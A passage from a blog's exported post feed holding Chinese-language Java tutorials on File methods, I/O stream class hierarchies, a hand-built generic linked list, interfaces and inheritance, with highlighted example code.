<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">length</span><span class="params">()</span></span>;<span class="comment">//文件大小（字节长度）</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isDirectory</span><span class="params">()</span></span>;<span class="comment">//判断是否是目录</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFile</span><span class="params">()</span></span>;<span class="comment">//判断是否是文件</span></span><br><span class="line"><span class="keyword">public</span> File[] listFiles();<span class="comment">//列出目录内容</span></span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java流]]></title>
      <url>/2019/10/05/Java%E6%B5%81/</url>
      <content type="html"><![CDATA[<h1 id="流"><a href="#流" class="headerlink" title="流"></a>流</h1><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p>
<h1 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h1><ul>
<li>OutputStream(抽象基类)<ul>
<li>ByteArrayOutputStream</li>
<li>FileOutputStream</li>
<li>FilterOutputStream<ul>
<li>BufferedOutputStream</li>
<li>DataOutputStream</li>
<li>PrintStream</li>
</ul>
</li>
<li>ObjectOutputStream</li>
<li>PipedOutputStream</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span></span>;<span class="comment">//输出一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span> b[])</span></span>;<span class="comment">//输出一组字节</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span>[],<span class="keyword">int</span> off,<span class="keyword">int</span> len)</span></span>;<span class="comment">//输出部分字节流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span>；<span class="comment">//关闭</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>InputStream(抽象基类)<ul>
<li>ByteArrayInputStream</li>
<li>FileInputStream</li>
<li>FilterInputStream<ul>
<li>BufferedInputStream</li>
<li>DataInputStream</li>
<li>LineNumberInputStream</li>
<li>PushbackInputStream</li>
</ul>
</li>
<li>ObjectInputStream</li>
<li>PipedInputStream</li>
<li>SequenceInputStream</li>
<li>StringBufferInputStream</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> b)</span></span>;<span class="comment">//输入一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span> b[])</span></span>;<span class="comment">//输入一组字节</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span>[],<span class="keyword">int</span> off,<span class="keyword">int</span> len)</span></span>;<span class="comment">//输入部分字节流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span>；<span class="comment">//关闭</span></span></span><br></pre></td></tr></table></figure>

<h1 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h1><ul>
<li>Writer(抽象基类)<ul>
<li>BufferedWriter</li>
<li>CharArrayWriter</li>
<li>FilterWriter</li>
<li>OutputStreamWriter<ul>
<li>FileWriter</li>
</ul>
</li>
<li>PipedWriter</li>
<li>StringWriter</li>
<li>PrintWriter</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span>[] c)</span></span>;<span class="comment">//输出字符数组</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(String s)</span></span>;<span class="comment">//输出字符串</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span>；<span class="comment">//关闭</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>Reader(抽象基类)<ul>
<li>BufferedReader<ul>
<li>LineNumberReader</li>
</ul>
</li>
<li>CharArrayReader</li>
<li>FilterReader<ul>
<li>PushbackReader</li>
</ul>
</li>
<li>InputStreamReader<ul>
<li>FileReader</li>
</ul>
</li>
<li>PipedReader</li>
<li>StringReader</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span> <span class="params">(<span class="keyword">char</span>[] c)</span></span>;<span class="comment">//接受数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span>；<span class="comment">//关闭</span></span></span><br></pre></td></tr></table></figure>

<h1 id="流的分类"><a href="#流的分类" class="headerlink" title="流的分类"></a>流的分类</h1><p>节点流：如 FileInputStream、FileOutputStream。</p>
<p>过滤流（中间流）：必须以其他流对象为参数，如 缓冲流：如 BufferedInputStream、BufferedOutputStream 数据流：如 DataInputStream、 DataOutputStream及其它过滤流。</p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java链表]]></title>
      <url>/2019/10/05/Java%E9%93%BE%E8%A1%A8/</url>
      <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Ilink</span>&lt;<span class="title">E</span>&gt; </span>&#123;		<span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span> <span class="params">(E e)</span></span>;		<span class="comment">//添加数据</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;		<span class="comment">//获取数据个数</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;		<span class="comment">//节点是否为空</span></span><br><span class="line">	<span class="keyword">public</span> Object [] toArray();		<span class="comment">//返回数据集合</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>;		<span class="comment">//索引</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index,E data)</span></span>;		 <span class="comment">//修改索引数据</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E data)</span></span>;		<span class="comment">//判断数据是否存在</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(E e)</span></span>;		<span class="comment">//删除数据</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clean</span><span class="params">()</span></span>;		<span class="comment">//清空链表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkImpl</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Ilink</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;		<span class="comment">//内部类，保存节点数据关系</span></span><br><span class="line">		<span class="keyword">private</span> E data ;		<span class="comment">//保存数据</span></span><br><span class="line">		<span class="keyword">private</span> Node next;		<span class="comment">//下一个节点</span></span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span> <span class="params">(E data)</span> </span>&#123;		<span class="comment">//有数据才有意义</span></span><br><span class="line">			<span class="keyword">this</span>.data =data;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*第一次调用this=root.addNode</span></span><br><span class="line"><span class="comment">		 * 第二次调用this=root.next.addNode</span></span><br><span class="line"><span class="comment">		 *第三次调用this=root.next.next.addNode</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNode</span><span class="params">(Node newNode)</span> </span>&#123;		<span class="comment">//保存新得Node数据</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">this</span>.next == <span class="keyword">null</span>) &#123;		<span class="comment">//当前节点的下一个节点为空</span></span><br><span class="line">				<span class="keyword">this</span>.next =newNode;		<span class="comment">//保存</span></span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">this</span>.next.addNode(newNode);			<span class="comment">//递归</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toArrayNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			LinkImpl.<span class="keyword">this</span>.returnData[LinkImpl.<span class="keyword">this</span>.foot++] = <span class="keyword">this</span>.data;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">this</span>.next != <span class="keyword">null</span>) &#123;		<span class="comment">//不为空</span></span><br><span class="line">				<span class="keyword">this</span>.next.toArrayNode();		<span class="comment">//递归</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> E <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(LinkImpl.<span class="keyword">this</span>.foot++ == index) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>.data;		<span class="comment">//返回数据</span></span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>.next.getNode(index);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNode</span><span class="params">(<span class="keyword">int</span> index,E data)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(LinkImpl.<span class="keyword">this</span>.foot++ == index) &#123;</span><br><span class="line">				<span class="keyword">this</span>.data=data;		<span class="comment">//修改数据</span></span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">this</span>.next.setNode(index,data);		<span class="comment">//递归</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNode</span><span class="params">(E data)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(data.equals(<span class="keyword">this</span>.data)) &#123;	<span class="comment">//比较数据</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">this</span>.next==<span class="keyword">null</span>) &#123;		<span class="comment">//判断下一个是否为空</span></span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">this</span>.next.containsNode(data);		<span class="comment">//递归</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">(Node previous,E data)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">this</span>.data.equals(data)) &#123;</span><br><span class="line">				previous.next =<span class="keyword">this</span>.next;	<span class="comment">//跳过当前节点</span></span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">this</span>.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">this</span>.next.removeNode(<span class="keyword">this</span>,data);	<span class="comment">//向后删除</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//-------------------------Link类属性--------------------------------------</span></span><br><span class="line">	<span class="keyword">private</span> Node root;		<span class="comment">//保存根</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> count;		<span class="comment">//个数</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> foot;		<span class="comment">//角标</span></span><br><span class="line">	<span class="keyword">private</span> Object [] returnData;		<span class="comment">//返回数据</span></span><br><span class="line">	<span class="comment">//-------------------------Link类方法--------------------------------------</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(e == <span class="keyword">null</span>) &#123;		<span class="comment">//判断数据是否为空</span></span><br><span class="line">			<span class="keyword">return</span>;		<span class="comment">//为空直接结束</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//将数据封装到Node类中</span></span><br><span class="line">		Node newNode = <span class="keyword">new</span> Node(e);		<span class="comment">//创建一个新节点</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>.root == <span class="keyword">null</span>) &#123;		<span class="comment">//没有根节点情况</span></span><br><span class="line">			<span class="keyword">this</span>.root = newNode;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;		<span class="comment">//存在根节点</span></span><br><span class="line">			<span class="keyword">this</span>.root.addNode(newNode);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.count++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;		<span class="comment">//统计个数</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;	<span class="comment">//判断是否为空</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.count==<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> Object [] toArray() &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>.isEmpty()) &#123;		<span class="comment">//判断是否为空</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.foot=<span class="number">0</span>;	<span class="comment">//脚本清零</span></span><br><span class="line">		<span class="keyword">this</span>.returnData=<span class="keyword">new</span> Object[<span class="keyword">this</span>.count];		<span class="comment">//设置长度</span></span><br><span class="line">		<span class="keyword">this</span>.root.toArrayNode();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.returnData;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(index &gt;= count) &#123;		<span class="comment">//索引长度</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.foot=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.root.getNode(index);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index,E data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(index &gt;= count) &#123;		<span class="comment">//索引长度</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.foot=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.root.setNode(index,data);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(data == <span class="keyword">null</span>) &#123;		<span class="comment">//判断是否为空</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.root.containsNode(data);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(E data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>.contains(data)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">this</span>.root.data.equals(data)) &#123;</span><br><span class="line">				<span class="keyword">this</span>.root=<span class="keyword">this</span>.root.next;</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">this</span>.root.next.removeNode(<span class="keyword">this</span>.root, data);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.count--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.root=<span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">this</span>.count=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">			Ilink&lt;String&gt; all = <span class="keyword">new</span> LinkImpl&lt;String&gt;();</span><br><span class="line">			System.out.println(all.size());</span><br><span class="line">			System.out.println(all.isEmpty());</span><br><span class="line">			System.out.println(<span class="string">"--------------------------------------------"</span>);</span><br><span class="line">			all.add(<span class="string">"hello"</span>);</span><br><span class="line">			all.add(<span class="string">"hell1"</span>);</span><br><span class="line">			all.add(<span class="string">"hell2"</span>);</span><br><span class="line">			all.set(<span class="number">2</span>,<span class="string">"11111"</span>);</span><br><span class="line">			all.remove(<span class="string">"hell1"</span>);</span><br><span class="line">			all.clean();</span><br><span class="line">			System.out.println(all.isEmpty());</span><br><span class="line">			System.out.println(all.size());</span><br><span class="line">			System.out.println(<span class="string">"--------------------------------------------"</span>);</span><br><span class="line">			Object result[] = all.toArray();</span><br><span class="line">			<span class="keyword">if</span>(result !=<span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span>(Object obj : result) &#123;</span><br><span class="line">					System.out.println(obj);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java接口]]></title>
      <url>/2019/10/05/Java%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p><code>在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明</code></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>一个接口可以有多个方法</li>
<li>接口不能用于实例化对象</li>
<li>接口没有构造方法</li>
<li>接口中所有的方法必须是抽象方法</li>
<li>接口支持多继承</li>
<li>接口不是被类继承了，而是要被类实现</li>
<li>接口不能包含成员变量，除了 static 和 final 变量</li>
</ul>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><blockquote>
<p>接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）</p>
</blockquote>
<blockquote>
<p>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）</p>
</blockquote>
<blockquote>
<p>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法</p>
</blockquote>
<h2 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h2><ol>
<li>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li>
<li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li>
<li>接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li>
<li>一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li>
<li>如果一个类实现了接口，那么该子类必须实现父接口的所有方法。如果一个类继承了抽象类，那么该子类必须实现抽象类的所有抽象方法。</li>
<li>如果是抽象类要实现接口，可以实现部分或者一个都不实现就行</li>
</ol>
<h2 id="接口使用"><a href="#接口使用" class="headerlink" title="接口使用"></a>接口使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IAnimal</span></span>&#123;<span class="comment">//定义接口 名称为IAnimal</span></span><br><span class="line">    <span class="comment">// 声明变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;<span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">IAnimal</span></span>&#123;<span class="comment">//使用接口，多个用,隔开</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;<span class="comment">//接口实现</span></span><br><span class="line">      System.out.println(<span class="string">"eats"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java继承]]></title>
      <url>/2019/10/05/Java%E7%BB%A7%E6%89%BF/</url>
      <content type="html"><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li>子类拥有父类非 private 的属性、方法。</li>
<li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li>
<li>子类可以用自己的方式实现父类的方法。</li>
<li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li>
<li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li>
</ul>
<h2 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h2><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
<p>this关键字：指向自己的引用。</p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul>
<li>单继承</li>
</ul>
<p>A继承B</p>
<ul>
<li>多重继承</li>
</ul>
<p>A继承B，B继承C</p>
<p><code>不能多继承如：A继承B和C</code></p>
<h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">Animal</span> </span>&#123;<span class="comment">//父类</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;<span class="comment">//子类继承父类</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

